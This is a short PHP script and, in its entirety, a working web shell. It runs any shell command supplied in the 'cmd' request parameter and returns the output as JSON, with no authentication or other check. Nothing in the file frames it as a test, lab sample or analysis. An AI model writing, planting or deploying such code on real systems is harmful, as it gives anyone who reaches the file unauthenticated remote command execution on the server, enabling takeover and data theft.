<?php

$data = shell_exec($_REQUEST['cmd']);
echo json_encode(["data"=>$data]);